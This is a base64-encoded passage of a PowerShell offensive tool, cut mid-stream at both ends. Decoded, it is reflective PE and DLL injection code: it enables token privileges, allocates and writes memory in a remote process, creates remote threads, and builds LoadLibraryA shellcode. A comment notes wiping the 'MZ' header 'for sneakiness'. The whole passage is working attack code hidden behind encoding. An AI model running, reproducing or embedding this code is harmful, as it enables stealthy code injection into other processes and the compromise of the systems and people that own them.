D0gMQoJCSRUb2tlblByaXZpbGVnZXMuUHJpdmlsZWdlcy5MdWlkID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFBMdWlkLCBbVHlwZV0kV2luMzJUeXBlcy5MVUlEKQoJCSRUb2tlblByaXZpbGVnZXMuUHJpdmlsZWdlcy5BdHRyaWJ1dGVzID0gJFdpbjMyQ29uc3RhbnRzLlNFX1BSSVZJTEVHRV9FTkFCTEVECgkJW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJFRva2VuUHJpdmlsZWdlcywgJFRva2VuUHJpdmlsZWdlc01lbSwgJHRydWUpCgoJCSRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuQWRqdXN0VG9rZW5Qcml2aWxlZ2VzLkludm9rZSgkVGhyZWFkVG9rZW4sICRmYWxzZSwgJFRva2VuUHJpdmlsZWdlc01lbSwgJFRva2VuUHJpdlNpemUsIFtJbnRQdHJdOjpaZXJvLCBbSW50UHRyXTo6WmVybykKCQkkRXJyb3JDb2RlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKSAjTmVlZCB0aGlzIHRvIGdldCBzdWNjZXNzIHZhbHVlIG9yIGZhaWx1cmUgdmFsdWUKCQlpZiAoKCRSZXN1bHQgLWVxICRmYWxzZSkgLW9yICgkRXJyb3JDb2RlIC1uZSAwKSkKCQl7CgkJCSNUaHJvdyAiVW5hYmxlIHRvIGNhbGwgQWRqdXN0VG9rZW5Qcml2aWxlZ2VzLiBSZXR1cm4gdmFsdWU6ICRSZXN1bHQsIEVycm9yY29kZTogJEVycm9yQ29kZSIgICAjdG9kbyBuZWVkIHRvIGRldGVjdCBpZiBhbHJlYWR5IHNldAoJCX0KCQkKCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpGcmVlSEdsb2JhbCgkVG9rZW5Qcml2aWxlZ2VzTWVtKQoJfQoJCgkKCUZ1bmN0aW9uIENyZWF0ZS1SZW1vdGVUaHJlYWQKCXsKCQlQYXJhbSgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtJbnRQdHJdCgkJJFByb2Nlc3NIYW5kbGUsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbSW50UHRyXQoJCSRTdGFydEFkZHJlc3MsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICRmYWxzZSldCgkJW0ludFB0cl0KCQkkQXJndW1lbnRQdHIgPSBbSW50UHRyXTo6WmVybywKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gNCwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMkZ1bmN0aW9ucwoJCSkKCQkKCQlbSW50UHRyXSRSZW1vdGVUaHJlYWRIYW5kbGUgPSBbSW50UHRyXTo6WmVybwoJCQoJCSRPU1ZlcnNpb24gPSBbRW52aXJvbm1lbnRdOjpPU1ZlcnNpb24uVmVyc2lvbgoJCSNWaXN0YSBhbmQgV2luNwoJCWlmICgoJE9TVmVyc2lvbiAtZ2UgKE5ldy1PYmplY3QgJ1ZlcnNpb24nIDYsMCkpIC1hbmQgKCRPU1ZlcnNpb24gLWx0IChOZXctT2JqZWN0ICdWZXJzaW9uJyA2LDIpKSkKCQl7CgkJCSNXcml0ZS1WZXJib3NlICJXaW5kb3dzIFZpc3RhLzcgZGV0ZWN0ZWQsIHVzaW5nIE50Q3JlYXRlVGhyZWFkRXguIEFkZHJlc3Mgb2YgdGhyZWFkOiAkU3RhcnRBZGRyZXNzIgoJCQkkUmV0VmFsPSAkV2luMzJGdW5jdGlvbnMuTnRDcmVhdGVUaHJlYWRFeC5JbnZva2UoW1JlZl0kUmVtb3RlVGhyZWFkSGFuZGxlLCAweDFGRkZGRiwgW0ludFB0cl06Olplcm8sICRQcm9jZXNzSGFuZGxlLCAkU3RhcnRBZGRyZXNzLCAkQXJndW1lbnRQdHIsICRmYWxzZSwgMCwgMHhmZmZmLCAweGZmZmYsIFtJbnRQdHJdOjpaZXJvKQoJCQkkTGFzdEVycm9yID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQoJCQlpZiAoJFJlbW90ZVRocmVhZEhhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pCgkJCXsKCQkJCVRocm93ICJFcnJvciBpbiBOdENyZWF0ZVRocmVhZEV4LiBSZXR1cm4gdmFsdWU6ICRSZXRWYWwuIExhc3RFcnJvcjogJExhc3RFcnJvciIKCQkJfQoJCX0KCQkjWFAvV2luOAoJCWVsc2UKCQl7CgkJCSNXcml0ZS1WZXJib3NlICJXaW5kb3dzIFhQLzggZGV0ZWN0ZWQsIHVzaW5nIENyZWF0ZVJlbW90ZVRocmVhZC4gQWRkcmVzcyBvZiB0aHJlYWQ6ICRTdGFydEFkZHJlc3MiCgkJCSRSZW1vdGVUaHJlYWRIYW5kbGUgPSAkV2luMzJGdW5jdGlvbnMuQ3JlYXRlUmVtb3RlVGhyZWFkLkludm9rZSgkUHJvY2Vzc0hhbmRsZSwgW0ludFB0cl06Olplcm8sIFtVSW50UHRyXVtVSW50NjRdMHhGRkZGLCAkU3RhcnRBZGRyZXNzLCAkQXJndW1lbnRQdHIsIDAsIFtJbnRQdHJdOjpaZXJvKQoJCX0KCQkKCQlpZiAoJFJlbW90ZVRocmVhZEhhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pCgkJewoJCQlXcml0ZS1FcnJvciAiRXJyb3IgY3JlYXRpbmcgcmVtb3RlIHRocmVhZCwgdGhyZWFkIGhhbmRsZSBpcyBudWxsIiAtRXJyb3JBY3Rpb24gU3RvcAoJCX0KCQkKCQlyZXR1cm4gJFJlbW90ZVRocmVhZEhhbmRsZQoJfQoKCQoKCUZ1bmN0aW9uIEdldC1JbWFnZU50SGVhZGVycwoJewoJCVBhcmFtKAoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW0ludFB0cl0KCQkkUEVIYW5kbGUsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3lzdGVtLk9iamVjdF0KCQkkV2luMzJUeXBlcwoJCSkKCQkKCQkkTnRIZWFkZXJzSW5mbyA9IE5ldy1PYmplY3QgU3lzdGVtLk9iamVjdAoJCQoJCSNOb3JtYWxseSB3b3VsZCB2YWxpZGF0ZSBET1NIZWFkZXIgaGVyZSwgYnV0IHdlIGRpZCBpdCBiZWZvcmUgdGhpcyBmdW5jdGlvbiB3YXMgY2FsbGVkIGFuZCB0aGVuIGRlc3Ryb3llZCAnTVonIGZvciBzbmVha2luZXNzCgkJJGRvc0hlYWRlciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRQRUhhbmRsZSwgW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfRE9TX0hFQURFUikKCgkJI0dldCBJTUFHRV9OVF9IRUFERVJTCgkJW0ludFB0cl0kTnRIZWFkZXJzUHRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVIYW5kbGUpIChbSW50NjRdW1VJbnQ2NF0kZG9zSGVhZGVyLmVfbGZhbmV3KSkKCQkkTnRIZWFkZXJzSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE50SGVhZGVyc1B0ciAtVmFsdWUgJE50SGVhZGVyc1B0cgoJCSRpbWFnZU50SGVhZGVyczY0ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJE50SGVhZGVyc1B0ciwgW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfTlRfSEVBREVSUzY0KQoJCQoJCSNNYWtlIHN1cmUgdGhlIElNQUdFX05UX0hFQURFUlMgY2hlY2tzIG91dC4gSWYgaXQgZG9lc24ndCwgdGhlIGRhdGEgc3RydWN0dXJlIGlzIGludmFsaWQuIFRoaXMgc2hvdWxkIG5ldmVyIGhhcHBlbi4KCSAgICBpZiAoJGltYWdlTnRIZWFkZXJzNjQuU2lnbmF0dXJlIC1uZSAweDAwMDA0NTUwKQoJICAgIHsKCSAgICAgICAgdGhyb3cgIkludmFsaWQgSU1BR0VfTlRfSEVBREVSIHNpZ25hdHVyZS4iCgkgICAgfQoJCQoJCWlmICgkaW1hZ2VOdEhlYWRlcnM2NC5PcHRpb25hbEhlYWRlci5NYWdpYyAtZXEgJ0lNQUdFX05UX09QVElPTkFMX0hEUjY0X01BR0lDJykKCQl7CgkJCSROdEhlYWRlcnNJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfTlRfSEVBREVSUyAtVmFsdWUgJGltYWdlTnRIZWFkZXJzNjQKCQkJJE50SGVhZGVyc0luZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQRTY0Qml0IC1WYWx1ZSAkdHJ1ZQoJCX0KCQllbHNlCgkJewoJCQkkSW1hZ2VOdEhlYWRlcnMzMiA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCROdEhlYWRlcnNQdHIsIFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX05UX0hFQURFUlMzMikKCQkJJE50SGVhZGVyc0luZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9OVF9IRUFERVJTIC1WYWx1ZSAkaW1hZ2VOdEhlYWRlcnMzMgoJCQkkTnRIZWFkZXJzSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBFNjRCaXQgLVZhbHVlICRmYWxzZQoJCX0KCQkKCQlyZXR1cm4gJE50SGVhZGVyc0luZm8KCX0KCgoJI1RoaXMgZnVuY3Rpb24gd2lsbCBnZXQgdGhlIGluZm9ybWF0aW9uIG5lZWRlZCB0byBhbGxvY2F0ZWQgc3BhY2UgaW4gbWVtb3J5IGZvciB0aGUgUEUKCUZ1bmN0aW9uIEdldC1QRUJhc2ljSW5mbwoJewoJCVBhcmFtKAoJCVtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUgKV0KCQlbQnl0ZVtdXQoJCSRQRUJ5dGVzLAoJCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW1N5c3RlbS5PYmplY3RdCgkJJFdpbjMyVHlwZXMKCQkpCgkJCgkJJFBFSW5mbyA9IE5ldy1PYmplY3QgU3lzdGVtLk9iamVjdAoJCQoJCSNXcml0ZSB0aGUgUEUgdG8gbWVtb3J5IHRlbXBvcmFyaWx5IHNvIEkgY2FuIGdldCBpbmZvcm1hdGlvbiBmcm9tIGl0LiBUaGlzIGlzIG5vdCBpdCdzIGZpbmFsIHJlc3Rpbmcgc3BvdC4KCQlbSW50UHRyXSRVbm1hbmFnZWRQRUJ5dGVzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRQRUJ5dGVzLkxlbmd0aCkKCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQRUJ5dGVzLCAwLCAkVW5tYW5hZ2VkUEVCeXRlcywgJFBFQnl0ZXMuTGVuZ3RoKSB8IE91dC1OdWxsCgkJCgkJI0dldCBOdEhlYWRlcnNJbmZvCgkJJE50SGVhZGVyc0luZm8gPSBHZXQtSW1hZ2VOdEhlYWRlcnMgLVBFSGFuZGxlICRVbm1hbmFnZWRQRUJ5dGVzIC1XaW4zMlR5cGVzICRXaW4zMlR5cGVzCgkJCgkJI0J1aWxkIGEgc3RydWN0dXJlIHdpdGggdGhlIGluZm9ybWF0aW9uIHdoaWNoIHdpbGwgYmUgbmVlZGVkIGZvciBhbGxvY2F0aW5nIG1lbW9yeSBhbmQgd3JpdGluZyB0aGUgUEUgdG8gbWVtb3J5CgkJJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICdQRTY0Qml0JyAtVmFsdWUgKCROdEhlYWRlcnNJbmZvLlBFNjRCaXQpCgkJJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICdPcmlnaW5hbEltYWdlQmFzZScgLVZhbHVlICgkTnRIZWFkZXJzSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkltYWdlQmFzZSkKCQkkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ1NpemVPZkltYWdlJyAtVmFsdWUgKCROdEhlYWRlcnNJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuU2l6ZU9mSW1hZ2UpCgkJJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICdTaXplT2ZIZWFkZXJzJyAtVmFsdWUgKCROdEhlYWRlcnNJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuU2l6ZU9mSGVhZGVycykKCQkkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ0RsbENoYXJhY3RlcmlzdGljcycgLVZhbHVlICgkTnRIZWFkZXJzSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkRsbENoYXJhY3RlcmlzdGljcykKCQkKCQkjRnJlZSB0aGUgbWVtb3J5IGFsbG9jYXRlZCBhYm92ZSwgdGhpcyBpc24ndCB3aGVyZSB3ZSBhbGxvY2F0ZSB0aGUgUEUgdG8gbWVtb3J5CgkJW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6RnJlZUhHbG9iYWwoJFVubWFuYWdlZFBFQnl0ZXMpCgkJCgkJcmV0dXJuICRQRUluZm8KCX0KCgoJI1BFSW5mbyBtdXN0IGNvbnRhaW4gdGhlIGZvbGxvd2luZyBOb3RlUHJvcGVydGllczoKCSMJUEVIYW5kbGU6IEFuIEludFB0ciB0byB0aGUgYWRkcmVzcyB0aGUgUEUgaXMgbG9hZGVkIHRvIGluIG1lbW9yeQoJRnVuY3Rpb24gR2V0LVBFRGV0YWlsZWRJbmZvCgl7CgkJUGFyYW0oCgkJW1BhcmFtZXRlciggUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW0ludFB0cl0KCQkkUEVIYW5kbGUsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3lzdGVtLk9iamVjdF0KCQkkV2luMzJUeXBlcywKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMkNvbnN0YW50cwoJCSkKCQkKCQlpZiAoJFBFSGFuZGxlIC1lcSAkbnVsbCAtb3IgJFBFSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykKCQl7CgkJCXRocm93ICdQRUhhbmRsZSBpcyBudWxsIG9yIEludFB0ci5aZXJvJwoJCX0KCQkKCQkkUEVJbmZvID0gTmV3LU9iamVjdCBTeXN0ZW0uT2JqZWN0CgkJCgkJI0dldCBOdEhlYWRlcnMgaW5mb3JtYXRpb24KCQkkTnRIZWFkZXJzSW5mbyA9IEdldC1JbWFnZU50SGVhZGVycyAtUEVIYW5kbGUgJFBFSGFuZGxlIC1XaW4zMlR5cGVzICRXaW4zMlR5cGVzCgkJCgkJI0J1aWxkIHRoZSBQRUluZm8gb2JqZWN0CgkJJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBFSGFuZGxlIC1WYWx1ZSAkUEVIYW5kbGUKCQkkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfTlRfSEVBREVSUyAtVmFsdWUgKCROdEhlYWRlcnNJbmZvLklNQUdFX05UX0hFQURFUlMpCgkJJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE50SGVhZGVyc1B0ciAtVmFsdWUgKCROdEhlYWRlcnNJbmZvLk50SGVhZGVyc1B0cikKCQkkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUEU2NEJpdCAtVmFsdWUgKCROdEhlYWRlcnNJbmZvLlBFNjRCaXQpCgkJJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICdTaXplT2ZJbWFnZScgLVZhbHVlICgkTnRIZWFkZXJzSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLlNpemVPZkltYWdlKQoJCQoJCWlmICgkUEVJbmZvLlBFNjRCaXQgLWVxICR0cnVlKQoJCXsKCQkJW0ludFB0cl0kU2VjdGlvbkhlYWRlclB0ciA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFBFSW5mby5OdEhlYWRlcnNQdHIpIChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfTlRfSEVBREVSUzY0KSkpCgkJCSRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBTZWN0aW9uSGVhZGVyUHRyIC1WYWx1ZSAkU2VjdGlvbkhlYWRlclB0cgoJCX0KCQllbHNlCgkJewoJCQlbSW50UHRyXSRTZWN0aW9uSGVhZGVyUHRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLk50SGVhZGVyc1B0cikgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9OVF9IRUFERVJTMzIpKSkKCQkJJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFNlY3Rpb25IZWFkZXJQdHIgLVZhbHVlICRTZWN0aW9uSGVhZGVyUHRyCgkJfQoJCQoJCWlmICgoJE50SGVhZGVyc0luZm8uSU1BR0VfTlRfSEVBREVSUy5GaWxlSGVhZGVyLkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfRklMRV9ETEwpIC1lcSAkV2luMzJDb25zdGFudHMuSU1BR0VfRklMRV9ETEwpCgkJewoJCQkkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgRmlsZVR5cGUgLVZhbHVlICdETEwnCgkJfQoJCWVsc2VpZiAoKCROdEhlYWRlcnNJbmZvLklNQUdFX05UX0hFQURFUlMuRmlsZUhlYWRlci5DaGFyYWN0ZXJpc3RpY3MgLWJhbmQgJFdpbjMyQ29uc3RhbnRzLklNQUdFX0ZJTEVfRVhFQ1VUQUJMRV9JTUFHRSkgLWVxICRXaW4zMkNvbnN0YW50cy5JTUFHRV9GSUxFX0VYRUNVVEFCTEVfSU1BR0UpCgkJewoJCQkkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgRmlsZVR5cGUgLVZhbHVlICdFWEUnCgkJfQoJCWVsc2UKCQl7CgkJCVRocm93ICJQRSBmaWxlIGlzIG5vdCBhbiBFWEUgb3IgRExMIgoJCX0KCQkKCQlyZXR1cm4gJFBFSW5mbwoJfQoJCgkKCUZ1bmN0aW9uIEltcG9ydC1EbGxJblJlbW90ZVByb2Nlc3MKCXsKCQlQYXJhbSgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uPTAsIE1hbmRhdG9yeT0kdHJ1ZSldCgkJW0ludFB0cl0KCQkkUmVtb3RlUHJvY0hhbmRsZSwKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uPTEsIE1hbmRhdG9yeT0kdHJ1ZSldCgkJW0ludFB0cl0KCQkkSW1wb3J0RGxsUGF0aFB0cgoJCSkKCQkKCQkkUHRyU2l6ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkKCQkKCQkkSW1wb3J0RGxsUGF0aCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RyaW5nQW5zaSgkSW1wb3J0RGxsUGF0aFB0cikKCQkkRGxsUGF0aFNpemUgPSBbVUludFB0cl1bVUludDY0XShbVUludDY0XSRJbXBvcnREbGxQYXRoLkxlbmd0aCArIDEpCgkJJFJJbXBvcnREbGxQYXRoUHRyID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvY0V4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgW0ludFB0cl06Olplcm8sICREbGxQYXRoU2l6ZSwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX1JFQURXUklURSkKCQlpZiAoJFJJbXBvcnREbGxQYXRoUHRyIC1lcSBbSW50UHRyXTo6WmVybykKCQl7CgkJCVRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgbWVtb3J5IGluIHRoZSByZW1vdGUgcHJvY2VzcyIKCQl9CgoJCVtVSW50UHRyXSROdW1CeXRlc1dyaXR0ZW4gPSBbVUludFB0cl06Olplcm8KCQkkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5Xcml0ZVByb2Nlc3NNZW1vcnkuSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCAkUkltcG9ydERsbFBhdGhQdHIsICRJbXBvcnREbGxQYXRoUHRyLCAkRGxsUGF0aFNpemUsIFtSZWZdJE51bUJ5dGVzV3JpdHRlbikKCQkKCQlpZiAoJFN1Y2Nlc3MgLWVxICRmYWxzZSkKCQl7CgkJCVRocm93ICJVbmFibGUgdG8gd3JpdGUgRExMIHBhdGggdG8gcmVtb3RlIHByb2Nlc3MgbWVtb3J5IgoJCX0KCQlpZiAoJERsbFBhdGhTaXplIC1uZSAkTnVtQnl0ZXNXcml0dGVuKQoJCXsKCQkJVGhyb3cgIkRpZG4ndCB3cml0ZSB0aGUgZXhwZWN0ZWQgYW1vdW50IG9mIGJ5dGVzIHdoZW4gd3JpdGluZyBhIERMTCBwYXRoIHRvIGxvYWQgdG8gdGhlIHJlbW90ZSBwcm9jZXNzIgoJCX0KCQkKCQkkS2VybmVsMzJIYW5kbGUgPSAkV2luMzJGdW5jdGlvbnMuR2V0TW9kdWxlSGFuZGxlLkludm9rZSgia2VybmVsMzIuZGxsIikKCQkkTG9hZExpYnJhcnlBQWRkciA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRQcm9jQWRkcmVzcy5JbnZva2UoJEtlcm5lbDMySGFuZGxlLCAiTG9hZExpYnJhcnlBIikgI0tlcm5lbDMyIGxvYWRlZCB0byB0aGUgc2FtZSBhZGRyZXNzIGZvciBhbGwgcHJvY2Vzc2VzCgkJCgkJW0ludFB0cl0kRGxsQWRkcmVzcyA9IFtJbnRQdHJdOjpaZXJvCgkJI0ZvciA2NGJpdCBETEwncywgd2UgY2FuJ3QgdXNlIGp1c3QgQ3JlYXRlUmVtb3RlVGhyZWFkIHRvIGNhbGwgTG9hZExpYnJhcnkgYmVjYXVzZSBHZXRFeGl0Q29kZVRocmVhZCB3aWxsIG9ubHkgZ2l2ZSBiYWNrIGEgMzJiaXQgdmFsdWUsIGJ1dCB3ZSBuZWVkIGEgNjRiaXQgYWRkcmVzcwoJCSMJSW5zdGVhZCwgd3JpdGUgc2hlbGxjb2RlIHdoaWxlIGNhbGxzIExvYWRMaWJyYXJ5IGFuZCB3cml0ZXMgdGhlIHJlc3VsdCB0byBhIG1lbW9yeSBhZGRyZXNzIHdlIHNwZWNpZnkuIFRoZW4gcmVhZCBmcm9tIHRoYXQgbWVtb3J5IG9uY2UgdGhlIHRocmVhZCBmaW5pc2hlcy4KCQlpZiAoJFBFSW5mby5QRTY0Qml0IC1lcSAkdHJ1ZSkKCQl7CgkJCSNBbGxvY2F0ZSBtZW1vcnkgZm9yIHRoZSBhZGRyZXNzIHJldHVybmVkIGJ5IExvYWRMaWJyYXJ5QQoJCQkkTG9hZExpYnJhcnlBUmV0TWVtID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvY0V4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgW0ludFB0cl06Olplcm8sICREbGxQYXRoU2l6ZSwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX1JFQURXUklURSkKCQkJaWYgKCRMb2FkTGlicmFyeUFSZXRNZW0gLWVxIFtJbnRQdHJdOjpaZXJvKQoJCQl7CgkJCQlUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIG1lbW9yeSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MgZm9yIHRoZSByZXR1cm4gdmFsdWUgb2YgTG9hZExpYnJhcnlBIgoJCQl9CgkJCQoJCQkKCQkJI1dyaXRlIFNoZWxsY29kZSB0byB0aGUgcmVtb3RlIHByb2Nlc3Mgd2hpY2ggd2lsbCBjYWxsIExvYWRMaWJyYXJ5QSAoU2hlbGxjb2RlOiBMb2FkTGlicmFyeUEuYXNtKQoJCQkkTG9hZExpYnJhcnlTQzEgPSBAKDB4NTMsIDB4NDgsIDB4ODksIDB4ZTMsIDB4NDgsIDB4ODMsIDB4ZWMsIDB4MjAsIDB4NjYsIDB4ODMsIDB4ZTQsIDB4YzAsIDB4NDgsIDB4YjkpCgkJCSRMb2FkTGlicmFyeVNDMiA9IEAoMHg0OCwgMHhiYSkKCQkJJExvYWRMaWJyYXJ5U0MzID0gQCgweGZmLCAweGQyLCAweDQ4LCAweGJhKQoJCQkkTG9hZExpYnJhcnlTQzQgPSBAKDB4NDgsIDB4ODksIDB4MDIsIDB4NDgsIDB4ODksIDB4ZGMsIDB4NWIsIDB4YzMpCgkJCQoJCQkkU0NMZW5ndGggPSAkTG9hZExpYnJhcnlTQzEuTGVuZ3RoICsgJExvYWRMaWJyYXJ5U0MyLkxlbmd0aCArICRMb2FkTGlicmFyeVNDMy5MZW5ndGggKyAkTG9hZExpYnJhcnlTQzQuTGVuZ3RoICsgKCRQdHJTaXplICogMykKCQkJJFNDUFNNZW0gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFNDTGVuZ3RoKQoJCQkkU0NQU01lbU9yaWdpbmFsID0gJFNDUFNNZW0KCQkJCgkJCVdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRMb2FkTGlicmFyeVNDMSAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbQoJCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkTG9hZExpYnJhcnlTQzEuTGVuZ3RoKQoJCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkUkltcG9ydERsbFBhdGhQdHIsICRTQ1BTTWVtLCAkZmFsc2UpCgkJCSRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRQdHJTaXplKQoJCQlXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkTG9hZExpYnJhcnlTQzIgLU1lbW9y